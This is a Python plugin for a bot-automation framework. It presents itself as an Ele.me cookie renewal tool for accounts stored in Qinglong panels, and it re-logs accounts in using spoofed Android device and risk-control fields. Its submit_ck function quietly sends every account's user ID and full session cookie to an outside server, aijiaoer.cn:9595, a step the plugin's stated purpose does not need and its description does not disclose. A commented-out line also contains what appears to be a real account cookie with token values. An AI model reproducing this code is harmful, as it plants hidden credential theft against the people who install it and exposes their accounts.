# [author: chuan]
# [version: 3.2.3]
# [class: 工具类]
# [platform: qq,qb,wx,tb,tg]
# [title: 饿了么续期]
# [price: 0]
# [service: 2669943482]
# [priority: 9999]
# [public:true] 
# [description: 指令：饿了么续期。<br/>介绍：对对接容器中的elmck进行续期，需要查看续期详情请配参填写wxpusher参数。<br/>注意事项：需在“系统管理”->“插件权限”中开启qls数据权限<br/>更新：对推送结果切割，避免消息太长无法推送<br/>更新：对续期成功或有效账号进行启用<br/>更新：对sign接口负载均衡，旧版本已不能使用，务必更新<br/>更新：同步刷新我不饿数据桶ck，新增支持多变量<br/>更新：更新接口]
# [disable:false]
# [admin: true]
# [rule: ^饿了么续期$]
# [param: {"required":true,"key":"otto.elmxq_env","bool":false,"placeholder":"饿了么ck环境变量名","name":"elmxq_env","desc":"饿了么ck环境变量名，不填默认为elmck，多个用，隔开"}]
# [param: {"required":true,"key":"otto.elmxq_rq","bool":false,"placeholder":"需要续期的容器名","name":"elmxq_rq","desc":"请填写需要续期的奥特曼对接好容器名称，多容器用,隔开，英文逗号喔"}]
# [param: {"required":true,"key":"otto.wx_uid","bool":false,"placeholder":"wxpush_UID","name":"wx_uid","desc":"填写自己的wxpusher的UID"}]
# [param: {"required":true,"key":"otto.wx_appToken","bool":false,"placeholder":"wxpusher的appToken","name":"wx_appToken","desc":"wxpusher的appToken"}]
# [param: {"required":false,"key":"chuan_elm_config.forceRenew","placeholder":"","bool":true,"name":"是否强制续期","desc":"开启后无论CK是否有效都会续期"}]


import re
import json
import random
import requests
import middleware
import time
import hashlib
import datetime
from urllib.parse import quote,urlencode

def find_key_value(json_obj, key):
    if isinstance(json_obj, dict):
        if key in json_obj:
            return json_obj[key]
        for k, v in json_obj.items():
            result = find_key_value(v, key)
            if result is not None:
                return result
    elif isinstance(json_obj, list):
        for item in json_obj:
            result = find_key_value(item, key)
            if result is not None:
                return result
    return None

def wxpush(data, wxpusher_alluid, name, arg1, arg2, appToken):
    # WxPusher API地址
    api_url = 'https://wxpusher.zjiecode.com/api/send/message'
    # 按照序号字段对数据进行排序
    sorted_data = sorted(data, key=lambda x: x['序号'])
    # 构造要推送的表格内容
    table_content = ''
    for row in sorted_data:
        table_content += f"<tr><td style='border: 1px solid #ccc; padding: 6px;'>{row['序号']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['用户']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg1']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg2']}</td></tr>"
    table_html = f"<table style='border-collapse: collapse;'><tr style='background-color: #f2f2f2;'><th style='border: 1px solid #ccc; padding: 8px;'>🆔</th><th style='border: 1px solid #ccc; padding: 8px;'>{name}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg1}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg2}</th></tr>{table_content}</table>"
    # 构造请求参数
    params = {
        "appToken": appToken,
        'content': table_html,
        'contentType': 3,  # 表格类型
        'topicIds': [],  # 接收消息的用户ID列表，为空表示发送给所有用户
        "summary": f'elm续期推送',
        "uids": [wxpusher_alluid],
    }
    # 发送POST请求
    response = requests.post(api_url, json=params).json()
    status = find_key_value(response,'status')
    if status:
        middleware.notifyMasters(f'wxpusher推送结果：{status}')
    else:
        middleware.notifyMasters(f'wxpusher推送结果：{json.dumps(response)}')

def md5_string(s):
    md5_obj = hashlib.md5()
    md5_obj.update(s.encode('utf-8'))
    md5_hash = md5_obj.hexdigest()
    return md5_hash

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body)
    except:
        return

def get_ts():
    return int(time.time())

def ts_to_date(ts):
    dt = datetime.datetime.fromtimestamp(int(ts))
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def str2dict(cookie_string:str):
    try:
        cookie = {}
        needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
        for i in needlist:
            value = re.findall(f'{i}=(.+?);',cookie_string+';')
            key = i
            if value:
                cookie[key] = value[0]
        return cookie
    except Exception as e:
        print(f'❎Cookie解析错误: {e}')
    return {}

def dict2str(cookie_dict:dict,needh5=True):
    needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
    if needh5:
        needlist.append('_m_h5_tk')
        needlist.append('_m_h5_tk_enc')
    cookie_string = ''
    for key, value in cookie_dict.items():
        if key in needlist:
            cookie_string += f"{key}={value};"
    return cookie_string

class ELM:
    def __init__(self,cookie:str) -> None:
        self.cookie = str2dict(cookie)
        self.sid = self.cookie.get('cookie2')
        self.uid = self.cookie.get('unb')
        self.latitude = '30.040553114149304'
        self.longitude = '103.83792941623264'
    
    def getSign(self,time,data):
        if type(data) == dict:
            data = json.dumps(data)
        tk = self.cookie.get('_m_h5_tk') if self.cookie.get('_m_h5_tk') else 'a3690260a21965847b0a27348bd9c426'
        mh5tk = tk.split('_')[0]
        text = f'{mh5tk}&{time}&12574478&{data}'
        return hashlib.md5(text.encode()).hexdigest()


    def wait(self,start,end=None):
        if end:
            waitTime = random.randint(start,end)
        else:
            waitTime = start
        print(f'等待{waitTime}秒')
        time.sleep(start)

    # 获取用户信息
    def userInfo(self):
        host = 'waimai-guide.ele.me'
        api = 'mtop.alsc.personal.queryminecenter'
        data = {
            "sceneCode":"H5_ELEME_PERSONAL_CENTER",
            "sourceFrom":"H5",
            "latitude":self.latitude,
            "longitude":self.longitude,
            "cityId":""
            }
        response = self.h5commonReq(host,api,data)
        print(response)
        response = json.loads(response)
        if find_key_value(response,'userName') == '立即登录':
            return False
        else:
            return True
    
    def h5commonReq(self,host,api,data,v='1.0',trys=0):
        try:
            t = get_ts()
            sign = self.getSign(t,data)
            url = "https://" + host + "/h5/" + api + "/" + v + "/?jsv=2.7.0&appKey=12574478&t=" + str(t) + "&sign=" + sign + "&api=" + api + "&v=1.0&ecode=1&type=json&valueType=string&needLogin=true&LoginRequest=true&dataType=jsonp&ttid=1601274962374%40eleme_android_11.12.88"
            headers = {
                "Host": host,
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                "Content-type": "application/x-www-form-urlencoded",
                "Origin": "https://tb.ele.me",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://tb.ele.me/wow/alsc/mod/3fe8408d9ba38d4726448a87?spm-pre=a2ogi.bx828379.0.0&spm=a13.b_activity_kb_m69301.0.0",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cookie": dict2str(self.cookie),
            }
            if type(data) == dict:
                data = json.dumps(data)
            # body = 'data=' + quote(data)
            body = urlencode({
                'data': data
            })
            response = requests.post(url,headers=headers,data=body)
            setCookie = requests.utils.dict_from_cookiejar(response.cookies)
            if setCookie:
                self.cookie.update(setCookie)
            if response.status_code == 200:
                return response.text
            else:
                if trys >= 3:
                    print(f'重试次数用尽\n报错：{response.status_code}')
                    return
                else:
                    trys += 1
                    print(f'重试次数：{trys}\n报错：{response.status_code}')
                    self.wait(3,5)
                    return self.h5commonReq(host,api,data,v,trys)
        except Exception as e:
            if trys >= 3:
                print(f'重试次数用尽，报错：{e}')
                return
            else:
                trys += 1
                print(f'重试次数：{trys}\n报错：{e}')
                self.wait(3,5)
                return self.h5commonReq(host,api,data,v,trys)

    def autologinH5(self):
        try:
            needList= ['USERID','deviceId','token','umt','unb','utdid','cookie2','SID']
            miss_key = [key for key in needList if key not in self.cookie.keys()]
            if miss_key: # 参数不全
                return f'缺少参数{",".join(miss_key)}'
            ts = get_ts()
            ts = get_ts()
            host = 'guide-acs.m.taobao.com'
            api = 'com.taobao.mtop.mloginunitservice.autologin'
            data = json.dumps({
                "ext": "{\"apiReferer\":\"{\\\\\\\"eventName\\\\\\\":\\\\\\\"SESSION_INVALID\\\\\\\"}\"}",
                "userId": self.cookie.get('USERID'),
                "tokenInfo": '{"appName":"24895413","appVersion":"android_11.1.38","deviceId":"' + self.cookie.get('deviceId') + '","deviceName":"Android(AOSP on blueline)","locale":"zh_CN","sdkVersion":"android_5.3.3.4","site":25,"t":' + str(ts) + ',"token":"' + self.cookie.get('token') + '","ttid":"1608030065155@eleme_android_11.1.38","useAcitonType":true,"useDeviceToken":false,"utdid":""}',
                "riskControlInfo": '{"appStore":"1608030065155@eleme_android_11.1.38","deviceBrand":"Google","deviceModel":"AOSP on blueline","deviceName":"AOSP on blueline","osName":"android","osVersion":"10","screenSize":"0x0","t":' + str(ts) + ',"umidToken":"' + self.cookie.get('umt') + '","wua":""}'
            })
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            if res.get('data').get('code') == 3000 or res.get('data').get('code') == '3000':
                data = json.loads(res['data']['returnValue']['data'])
                for i in data['cookies']:
                    if 'cookie2=' in i:
                        self.cookie['cookie2'] = i.split(';')[0].split('cookie2=')[1]
                        return f'✅续期成功,有效期:{ts_to_date(data["expires"])}'
            else:
                return res.get('data').get('message')
        except Exception as e:  
            return str(e)

# 获取青龙token
class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''
    
    # 获取token
    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url)
        # print(res.text)
        if res.json().get('code') == 200:
            self.ql_token = res.json().get('data').get('token')
        else:
            print('连接青龙失败')
        
    # 查询环境变量
    def get_ql_env(self,value):
        url = f'{self.ql_ipport}/open/envs?searchValue={value}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers)
        # print(res.text)
        if res.json().get('code') == 200:
            return res.json().get('data')
    
    # 新增环境变量
    def submit_env(self,name,value,remarks):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json)
        # print(res.text)
        if res.json().get('code') == 200:
            return True
    
    # 更新环境变量
    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json)
        # print(res.text)
        if res.json().get('code') == 200:
            return True
    
    # 删除环境变量
    def delete_env(self,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.delete(url,headers=headers,json=json)
        # print(res.text)
        if res.json().get('code') == 200:
            return True
    
    # 禁用环境变量
    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        # print(res.text)
        if res.json().get('code') == 200:
            return True
    
    # 启用环境变量
    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        # print(res.text)
        if res.json().get('code') == 200:
            return True

def get_ql(need_name):
    qls = sender.bucketAllKeys('qls')
    for i in qls:
        ql = json.loads(sender.bucketGet('qls', i))
        host = ql.get('host')
        client_id = ql.get('client_id')
        client_secret = ql.get('client_secret')
        name = ql.get('name')
        if need_name == name:
            return host,client_id,client_secret

def chunk_list(data, chunk_size):
    # 使用列表推导式进行切片
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def main():
    allck = 0
    success = 0 # 续期成功个数
    noNeed = 0 # 有效不需要续期的ck
    # user = ELM('cookie2=14054b27a114e019af90a292f0f5672ce;unb=2204949637620;USERID=1000187931374;SID=MTZjZWJkZjIzNjJmNWFhZmVkYWRlNGY3MzI3MmEwYTRlw-lsFyiAsprESTgZMnsFZg==;token=1_idc_1_99038f98cee29fc0bebbeb918d1ea9cba36ae7cb5056988cbc6dfbb14aa6ecdd894aec28e4f8bca982ef05836b31898c053a968077a504e572afefb9e0640e4e25d33527bf199f1e22c2c2fc9c5c443e77ec57db32ff4f710bd1dad1eae9035d3c77a82da3f78d1cd346131663b3cb78b61f872be6bfca26c105d44d9ae9c458;utdid=ZM0U7oTpqlEDAD5CAi5n9jWW;deviceId=XBdmmqsu77KIgOTbFA-W-lePnZsFEIH9Epwa9CZ2tTKQ41DEuZ1Cqdo2LR4qsEM6;umt=nz0BTuNLPC9SlwKQEaLfr/NawUc8cftL;')
    # print('账号是否有效',user.userInfo())
    
    # # print(user.cookie)
    # print('账号是否刷新成功',user.autologinH5())
    # print('账号是否刷新成功',user.autologinH5())
    # print('账号是否有效',user.userInfo())
    # return

    # 获取青龙
    for elmxq_rq in elmxq_rqs.split(','):
        for env in elmxq_env:
            all_ts = [] # 通知内容
            middleware.notifyMasters(f'开始续期【{env}】-容器【{elmxq_rq}】')
            try:
                ql_host,client_id,client_secret = get_ql(elmxq_rq)
            except:
                sender.reply('获取青龙失败，可能没给qls插件权限')
                continue
            ql = qinglong(ql_host,client_id,client_secret)
            ql.get_ql_token() # 获取token
            envs = ql.get_ql_env(env)
            
            for index,env in enumerate(envs):
                allck += 1
                id = env['id']
                name = env['name']
                elmck = env['value']
                remarks = env['remarks']

                user = ELM(elmck)
                if middleware.bucketGet('chuan_elm_config','forceRenew') == 'true':
                    user.autologinH5()
                    result = user.autologinH5()
                    if '续期成功' in result:
                        ql.enable_env(id)
                        success += 1
                        # 去更新青龙ck
                        submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                        ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                        # 去更新我不饿CK
                        if user.cookie.get('USERID') in middleware.bucketAllKeys('chuan_elm_accountId'):
                            middleware.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                    if result == '非法的token':
                        ql.disable_env(id)
                else:
                    # 检测是否有效
                    user.autologinH5()
                    if user.userInfo():
                        ql.enable_env(id)
                        noNeed += 1
                        result = '原账号有效'
                        if middleware.bucketGet('chuan_elm_config','forceRenew') == 'true':
                            result = user.autologinH5()
                        submit_ck(user.cookie.get('USERID'),'elm',elmck,'true')
                    else:
                        result = user.autologinH5()
                        if result:
                            if '续期成功' in result:
                                ql.enable_env(id)
                                success += 1
                                # 去更新青龙ck
                                submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                                ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                                # 去更新我不饿CK
                                if user.cookie.get('USERID') in middleware.bucketAllKeys('chuan_elm_accountId'):
                                    middleware.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                            if result == '登录状态已经失效，请重新登录':
                                ql.disable_env(id)

                # 推送参数
                ts = {
                    '序号': index+1,
                    '用户': user.cookie.get('USERID'),
                    'arg1': result,
                    'arg2': elmxq_rq
                }
                all_ts.append(ts)
            
            wx_uid = middleware.get('wx_uid')
            wx_appToken = middleware.get('wx_appToken')
            for i in chunk_list(all_ts,80):
                if wx_uid and wx_appToken:
                    wxpush(i,wx_uid,'用户ID','续期结果','归属容器',wx_appToken)
                else:
                    middleware.notifyMasters('未配置uid和appToken推送wxpush参数')
                    break

    middleware.notifyMasters(f'====📢饿了么续期结果推送====\n总帐号：{allck}\n旧账号有效：{noNeed}\n续期成功：{success}\n续期失败：{allck-success-noNeed}\n详情请配置wxpush推送')

if __name__ == "__main__":
    senderID = middleware.getSenderID()
    sender = middleware.Sender(senderID)

    elmxq_env = re.split(r'[,，]', middleware.get('elmxq_env'))
    elmxq_rqs = middleware.get('elmxq_rq')
    main()